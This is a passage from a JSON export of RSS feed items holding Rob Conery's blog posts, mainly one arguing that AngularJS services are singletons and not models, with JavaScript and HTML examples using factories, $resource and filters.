not magically melded to my controller and it keeps the concepts a bit cleaner (to me).</p><p>Let's put the name first and formalize the overrides in a single place. This is how I think about things, at least, and it would be nice to see it all in one place.</p><h2>A Little Help?</h2><p>OK, You've installed Ember after reading a tutorial. You've seen a post with the API above and you want to get started writing some code.</p><p>Ember has created the App for you, but it doesn't have a View:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">Ember</span><span class=\"nx\">is</span><span class=\"nx\">installed</span><span class=\"nx\">and</span><span class=\"nx\">ready</span><span class=\"nx\">to</span><span class=\"nx\">go</span><span class=\"o\">!</span><span class=\"nx\">The</span><span class=\"nx\">first</span><span class=\"nx\">step</span><span class=\"nx\">is</span><span class=\"nx\">to</span><span class=\"nx\">create</span><span class=\"nx\">a</span><span class=\"nx\">view</span><span class=\"o\">:</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">script</span><span class=\"nx\">type</span><span class=\"o\">=</span><span class=\"s2\">\"text/x-handlebars\"</span><span class=\"nx\">data</span><span class=\"o\">-</span><span class=\"nx\">template</span><span class=\"o\">-</span><span class=\"nx\">name</span><span class=\"o\">=</span><span class=\"s1\">'application'</span><span class=\"o\">&gt;&lt;</span><span class=\"err\">/script&gt;</span></span><span class='line'></span><span class='line'><span class=\"nx\">Put</span><span class=\"nx\">that</span><span class=\"nx\">tag</span><span class=\"nx\">on</span><span class=\"nx\">your</span><span class=\"nx\">page</span><span class=\"nx\">where</span><span class=\"nx\">you</span><span class=\"nx\">want</span><span class=\"nx\">to</span><span class=\"nx\">see</span><span class=\"nx\">your</span><span class=\"nx\">app</span><span class=\"p\">.</span></span></code></pre></td></tr></table></div></figure><p>Nice - you copy paste that into your HTML page, and the next thing you see is...</p><div class='well'><h2>Hello, Welcome To Ember</h2><p>This is your Index space and you can override me by defining an index template:</p><pre><script type=\"text/x-handlebars\" data-template-name=\"index\"></ script></pre></p><p>... and overriding App.Index:</p><pre><code>App.Index = function(){return {//the code you see above}}</code></pre><p>You can read the<a href='#'>Documentation on what this is here</a>.</p></div><p>Not only did Ember create an<code>App</code>for us - it also created a default Index\"space\" if you will. That Index defaulted to a nice helpful message on what to do next.</p><h2>Arm Waving</h2><p>That's what this is. I might be completely crazy, I might utterly misunderstand what Ember is trying to do.</p><p>I'll tell you this, however:<strong>if this is the way Ember crafted their API, I'd love it.</strong>.</p><p>So there it is! I like being constructive when I can - hopefully this helps the team :).</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=rEbegmNcGV8:qHi1k0SsVbs:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=rEbegmNcGV8:qHi1k0SsVbs:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=rEbegmNcGV8:qHi1k0SsVbs:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=rEbegmNcGV8:qHi1k0SsVbs:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=rEbegmNcGV8:qHi1k0SsVbs:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=rEbegmNcGV8:qHi1k0SsVbs:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=rEbegmNcGV8:qHi1k0SsVbs:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/rEbegmNcGV8\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1270}}
{"k":"0000000084","o":"0000033852","v":"001"}
{"_id":1271,"_uid":1271,"_dt":1373742620975,"_s":"831fb9286dcbe3b48136b1aa9dc21ab8"}
{"subscription":{"$wrap":"$oid","v":52},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/VvpPVADxNBA/models-and-services-in-angular","title":"Models and Services in Angular","published":{"$wrap":"$date","v":1366902000000,"h":"2013-04-25T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>It can be confusing when trying to structure a client-side application, especially when it comes to separating models from controllers and services. Doing this in Angular means diving into some details.</p><p><img src='http://wekeroad.com/images/rocket_builder.jpg'/></p><p><p><i>Image from<a href=\"http://union-bulletin.com/news/2012/aug/03/one-part-science-one-part-excitement-equal-success/\">http://union-bulletin.com/news/2012/aug/03/one-part-science-one-part-excitement-equal-success/</a></i></p><h2>What's a Model? What's a Service?</h2><p>I read over a post by Joel Hooks today called<a href=\"http://joelhooks.com/blog/2013/04/24/modeling-data-and-state-in-your-angularjs-application/\">Modeling Data and State in Your AngularJS Application</a>and the idea was put forward that you can clean up your Controllers by (basically) using Angular's service as a model.</p><p>The idea is a good one:<strong>Clean Controllers are Godly Controllers</strong>but there's some confusion in the post that I think will end up spreading.</p><p>Straight up-front:<strong>All services (service(), factory(), provider()) in Angular are SINGLETONS</strong>. It's difficult under any circumstances to consider a Singleton as a model.</p><p>There are so many jargon-filled terms disseminated throughout different approaches to software design... but I think we can agree that a model is representative of data (as opposed to a Domain Model which is all of your stuff under a big umbrella).</p><p>In the post above, Joel has a list of authors and a quote from each one - a simple data structure:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">fowler</span><span class=\"o\">=</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Fowler\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">quote</span><span class=\"o\">:</span><span class=\"s2\">\"Any fool can write code that a computer can understand. Good programmers write code that humans can understand.\"</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">twain</span><span class=\"o\">=</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Twain\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">quote</span><span class=\"o\">:</span><span class=\"s2\">\"Why, I have known clergymen, good men, kind-hearted, liberal, sincere, and all that, who did not know the meaning of a'flush.' It is enough to make one ashamed of one's species.\"</span></span><span class='line'><span class=\"p\">};</span></span></code></pre></td></tr></table></div></figure><p>One might consider this list to be two instances of a single Model, Author:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span><span class='line-number'>16</span><span class='line-number'>17</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">Author</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">atts</span><span class=\"p\">){</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">self</span><span class=\"o\">=</span><span class=\"k\">this</span><span class=\"p\">;</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">initialSettings</span><span class=\"o\">=</span><span class=\"nx\">atts</span><span class=\"o\">||</span><span class=\"p\">{};</span></span><span class='line'><span class=\"c1\">//initial settings if passed in</span></span><span class='line'><span class=\"k\">for</span><span class=\"p\">(</span><span class=\"kd\">var</span><span class=\"nx\">setting</span><span class=\"k\">in</span><span class=\"nx\">initialSettings</span><span class=\"p\">){</span></span><span class='line'><span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nx\">initialSettings</span><span class=\"p\">.</span><span class=\"nx\">hasOwnProperty</span><span class=\"p\">(</span><span class=\"nx\">setting</span><span class=\"p\">))</span></span><span class='line'><span class=\"nx\">self</span><span class=\"p\">[</span><span class=\"nx\">setting</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"nx\">initialSettings</span><span class=\"p\">[</span><span class=\"nx\">setting</span><span class=\"p\">];</span></span><span class='line'><span class=\"p\">};</span></span><span class='line'></span><span class='line'><span class=\"c1\">//with some logic...</span></span><span class='line'><span class=\"nx\">self</span><span class=\"p\">.</span><span class=\"nx\">fullName</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(){</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">self</span><span class=\"p\">.</span><span class=\"nx\">first</span><span class=\"o\">+</span><span class=\"s2\">\"\"</span><span class=\"o\">+</span><span class=\"nx\">self</span><span class=\"p\">.</span><span class=\"nx\">last</span><span class=\"p\">;</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'></span><span class='line'><span class=\"c1\">//return the scope-safe instance</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">self</span><span class=\"p\">;</span></span><span class='line'><span class=\"p\">};</span></span></code></pre></td></tr></table></div></figure><p>Translating this to Joel's code:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">fowler</span><span class=\"o\">=</span><span class=\"nx\">Author</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Fowler\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">quote</span><span class=\"o\">:</span><span class=\"s2\">\"Any fool can write code that a computer can understand. Good programmers write code that humans can understand.\"</span></span><span class='line'><span class=\"p\">}),</span></span><span class='line'><span class=\"nx\">twain</span><span class=\"o\">=</span><span class=\"nx\">Author</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Twain\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">quote</span><span class=\"o\">:</span><span class=\"s2\">\"Why, I have known clergymen, good men, kind-hearted, liberal, sincere, and all that, who did not know the meaning of a'flush.' It is enough to make one ashamed of one's species.\"</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>So far, so good. Unfortunately I think some confusion crept in - here is the full example of Joel's code for his authorListModel:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span><span class='line-number'>16</span><span class='line-number'>17</span><span class='line-number'>18</span><span class='line-number'>19</span><span class='line-number'>20</span><span class='line-number'>21</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">angular</span><span class=\"p\">.</span><span class=\"nx\">module</span><span class=\"p\">(</span><span class=\"s1\">'modelDemo'</span><span class=\"p\">).</span><span class=\"nx\">service</span><span class=\"p\">(</span><span class=\"s2\">\"authorListModel\"</span><span class=\"p\">,</span><span class=\"p\">[</span><span class=\"s1\">'$rootScope'</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$rootScope</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">fowler</span><span class=\"o\">=</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Fowler\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">quote</span><span class=\"o\">:</span><span class=\"s2\">\"Any fool can write code that a computer can understand. Good programmers write code that humans can understand.\"</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">twain</span><span class=\"o\">=</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Twain\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">quote</span><span class=\"o\">:</span><span class=\"s2\">\"Why, I have known clergymen, good men, kind-hearted, liberal, sincere, and all that, who did not know the meaning of a'flush.' It is enough to make one ashamed of one's species.\"</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"c1\">//...</span></span><span class='line'></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">list</span><span class=\"o\">=</span><span class=\"p\">[</span><span class=\"nx\">fowler</span><span class=\"p\">,</span><span class=\"nx\">twain</span><span class=\"p\">,</span><span class=\"nx\">poe</span><span class=\"p\">,</span><span class=\"nx\">plato</span><span class=\"p\">];</span></span><span class='line'></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">selectedAuthor</span><span class=\"o\">=</span><span class=\"kc\">null</span><span class=\"p\">;</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">setSelectedAuthor</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">author</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">if</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">list</span><span class=\"p\">.</span><span class=\"nx\">indexOf</span><span class=\"p\">(</span><span class=\"nx\">author</span><span class=\"p\">)</span><span class=\"o\">&gt;</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">selectedAuthor</span><span class=\"o\">=</span><span class=\"nx\">author</span><span class=\"p\">;</span></span><span class='line'><span class=\"nx\">$rootScope</span><span class=\"p\">.</span><span class=\"nx\">$broadcast</span><span class=\"p\">(</span><span class=\"s1\">'authorModel::selectedAuthorUpdated'</span><span class=\"p\">,</span><span class=\"nx\">author</span><span class=\"p\">);</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">};</span></span><span class='line'><span class=\"p\">}]);</span></span></code></pre></td></tr></table></div></figure><p>In the first line we've told Angular that this function is to be used a Service. Services in Angular are Singletons - which can cause all kinds of interesting headaches if you treat that service as a Model.</p><p>In Joel's case there's nothing wrong with the code here - except that it's not a Model -<strong>it's a Service</strong>and before you think I'm nitpicking -<strong>Service, in Angular, has a very particular reason for existence</strong>and it's not this:</p><blockquote><p>... the “M” in MVC, model classes encapsulate your application’s data and provide an API to access and manipulate that data. The other classes in your application will make requests of models via this API. When data on the model is updated, the model dispatches events that the other classes within your application can react to.</p></blockquote><p>The definition is a good one - unfortunately the code that is being offered to support the definition is actually a Service, not a Model.</p><h2>So What About a Model?</h2><p>I get asked this a fair amount and my answer is typically:</p><blockquote><p>Your model lives on the server</p></blockquote><p><i>hat-tip to Steve Sanderson for this</i></p><p>This works in many ways: it frees you from duplicating code on the client and it keeps secret things secret (such as applying discounts to a shopping cart, etc).</p><p>But what about behavior on individual bits of data? Here's where things get interesting with Angular.</p><p>Let's say you use Angular's $resource to hook up to an Author resource in the sky somewhere:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">app</span><span class=\"o\">=</span><span class=\"nx\">angular</span><span class=\"p\">.</span><span class=\"nx\">module</span><span class=\"p\">(</span><span class=\"s2\">\"authorApp\"</span><span class=\"p\">,</span><span class=\"p\">[]);</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">api</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$resource</span><span class=\"p\">){</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">authors</span><span class=\"o\">=</span><span class=\"nx\">$resource</span><span class=\"p\">(</span><span class=\"s2\">\"/authors\"</span><span class=\"p\">);</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">service</span><span class=\"p\">(</span><span class=\"s2\">\"Api\"</span><span class=\"p\">,</span><span class=\"nx\">api</span><span class=\"p\">);</span></span></code></pre></td></tr></table></div></figure><p>You can use this in your controller like so:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">controller</span><span class=\"p\">(</span><span class=\"s2\">\"AuthorCtrl\"</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$scope</span><span class=\"p\">,</span><span class=\"nx\">Api</span><span class=\"p\">){</span></span><span class='line'></span><span class='line'><span class=\"c1\">//returns [{first :'Mark', last :'Twain', quote :'...'}]</span></span><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">authors</span><span class=\"o\">=</span><span class=\"nx\">Api</span><span class=\"p\">.</span><span class=\"nx\">authors</span><span class=\"p\">.</span><span class=\"nx\">query</span><span class=\"p\">();</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>That will send a GET request off to\"/authors\" and return a promise that will provide some data on success. Angular works really well with promises so there's no more code to be written here - when the data shows up, it hits the $scope which is\"bound\" to the UI through ng-repeat and off we go.</p><p>But how can we use our Author prototype above? A number of ways - let's go through this...</p><p>The first way is to get away from using\"service\" and have a bit more structure with a factory:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span><span class='line-number'>16</span><span class='line-number'>17</span><span class='line-number'>18</span><span class='line-number'>19</span><span class='line-number'>20</span><span class='line-number'>21</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">app</span><span class=\"o\">=</span><span class=\"nx\">angular</span><span class=\"p\">.</span><span class=\"nx\">module</span><span class=\"p\">(</span><span class=\"s2\">\"authorApp\"</span><span class=\"p\">,</span><span class=\"p\">[]);</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">api</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$resource</span><span class=\"p\">){</span></span><span class='line'></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">authorResource</span><span class=\"o\">=</span><span class=\"nx\">$resource</span><span class=\"p\">(</span><span class=\"s2\">\"/authors\"</span><span class=\"p\">);</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">queryAuthors</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">next</span><span class=\"p\">){</span></span><span class='line'><span class=\"c1\">//use a callback instead of a promise</span></span><span class='line'><span class=\"nx\">authorResource</span><span class=\"p\">.</span><span class=\"nx\">query</span><span class=\"p\">({},</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">results</span><span class=\"p\">){</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">out</span><span class=\"o\">=</span><span class=\"p\">[];</span></span><span class='line'><span class=\"c1\">//Underscore's\"each\" method</span></span><span class='line'><span class=\"nx\">_</span><span class=\"p\">.</span><span class=\"nx\">each</span><span class=\"p\">(</span><span class=\"nx\">results</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">result</span><span class=\"p\">){</span></span><span class='line'><span class=\"c1\">//using our Author prototype above</span></span><span class='line'><span class=\"nx\">out</span><span class=\"p\">.</span><span class=\"nx\">push</span><span class=\"p\">(</span><span class=\"nx\">Author</span><span class=\"p\">(</span><span class=\"nx\">result</span><span class=\"p\">));</span></span><span class='line'><span class=\"p\">});</span></span><span class='line'><span class=\"nx\">next</span><span class=\"p\">(</span><span class=\"nx\">result</span><span class=\"p\">);</span></span><span class='line'><span class=\"p\">});</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"k\">return</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">authors</span><span class=\"o\">:</span><span class=\"nx\">queryAuthors</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">factory</span><span class=\"p\">(</span><span class=\"s2\">\"Api\"</span><span class=\"p\">,</span><span class=\"nx\">api</span><span class=\"p\">);</span></span></code></pre></td></tr></table></div></figure><p>A bit more code... but either way we can use it this way:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">controller</span><span class=\"p\">(</span><span class=\"s2\">\"AuthorCtrl\"</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$scope</span><span class=\"p\">,</span><span class=\"nx\">Api</span><span class=\"p\">){</span></span><span class='line'></span><span class='line'><span class=\"c1\">//returns [{first :'Mark', last :'Twain', quote :'...'}]</span></span><span class='line'><span class=\"nx\">Api</span><span class=\"p\">.</span><span class=\"nx\">authors</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">results</span><span class=\"p\">){</span></span><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">authors</span><span class=\"o\">=</span><span class=\"nx\">results</span><span class=\"p\">;</span></span><span class='line'><span class=\"p\">});</span></span><span class='line'></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>Now we have a nice array of Authors. But we've also bent Angular just a bit because we're thinking like Software Developers - expecting\"behavior\" like\"fullName()\" to be on our model.</p><p>If we take a step back and consider what we're doing here (instrumenting the UI) - that doesn't make all that much sense. Here's where Joel and I will increase our disagreement :) and maybe you'll think I'm a dope.</p><h2>Domain vs. Presentation Concerns</h2><p>What is the motive for using the Author prototype? Typically, when working with Single Page Applications it's something that relates to:</p><ul><li>Code Reuse (Author might be reusable around the app)</li><li>Centralized Logic (fullName(), daysUntilBirthday())</li></ul><p>I'm going to put forward a bit of a strong opinion:<strong>if it's not presentation-related, it doesn't belong here</strong>. Hopefully we can agree on this as, well, the page is all about presentation and while yes there's logic flying around - it's presentation logic!</p><p>Angular provides a better facility for this kind of thing:<strong>they're called filters</strong>. In Angular we can do this:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">fullNameFilter</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(){</span></span><span class='line'><span class=\"k\">return</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">person</span><span class=\"p\">){</span></span><span class='line'><span class=\"c1\">//you can have some logic in here to introspect\"person\"</span></span><span class='line'><span class=\"c1\">//for\"first\" or\"firstName\" or whatever</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">person</span><span class=\"p\">.</span><span class=\"nx\">first</span><span class=\"o\">+</span><span class=\"s2\">\"\"</span><span class=\"o\">+</span><span class=\"nx\">person</span><span class=\"p\">.</span><span class=\"nx\">last</span><span class=\"p\">;</span></span><span class='line'><span class=\"p\">};</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"c1\">//add it to the app</span></span><span class='line'><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">filter</span><span class=\"p\">(</span><span class=\"s2\">\"fullname\"</span><span class=\"p\">,</span><span class=\"nx\">fullNameFilter</span><span class=\"p\">);</span></span></code></pre></td></tr></table></div></figure><p>In your code you can now ask for the full name like this:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;li</span><span class=\"na\">ng-repeat=</span><span class=\"s\">\"author in authors\"</span><span class=\"nt\">&gt;</span>{{ author | fullname}}<span class=\"nt\">&lt;/li&gt;</span></span><span class='line'><span class=\"nt\">&lt;/ul&gt;</span></span></code></pre></td></tr></table></div></figure><p>The really nice thing about this is that you can reuse these filters - in any project! Turning this back to Joel's post - can we solve the problem without introducing a new model/service?</p><p>I think so. In looking at the controller code that Joel wants to refactor, we see this:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">list</span><span class=\"o\">=</span><span class=\"p\">[</span><span class=\"nx\">twain</span><span class=\"p\">,</span><span class=\"nx\">fowler</span><span class=\"p\">,</span><span class=\"nx\">poe</span><span class=\"p\">,</span><span class=\"nx\">plato</span><span class=\"p\">];</span></span><span class='line'></span><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">selectQuote</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">author</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">selectedQuote</span><span class=\"o\">=</span><span class=\"nx\">author</span><span class=\"p\">.</span><span class=\"nx\">quote</span><span class=\"p\">;</span></span><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">selectedAuthor</span><span class=\"o\">=</span><span class=\"nx\">author</span><span class=\"p\">;</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'></span><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">isSelected</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">author</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">author</span><span class=\"o\">===</span><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">selectedAuthor</span><span class=\"p\">;</span></span><span class='line'><span class=\"p\">}</span></span></code></pre></td></tr></table></div></figure><p>I can guess as to a few reasons why it exists - but I don't think it's going out on a limb to think Joel wants to indicate visually which author the user wants to know more about.</p><p>There are a number of ways to solve this - from drop dead simple:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;li</span><span class=\"na\">ng-repeat=</span><span class=\"s\">\"author in authors\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"c\">&lt;!--select the author, then set the class or whatever is needed. Yay dynamic languages!--&gt;</span></span><span class='line'><span class=\"nt\">&lt;input</span><span class=\"na\">type=</span><span class=\"s\">'checkbox'</span><span class=\"na\">ng-model=</span><span class=\"s\">'author.selected'</span><span class=\"nt\">&gt;</span></span><span class='line'>{{fullname | 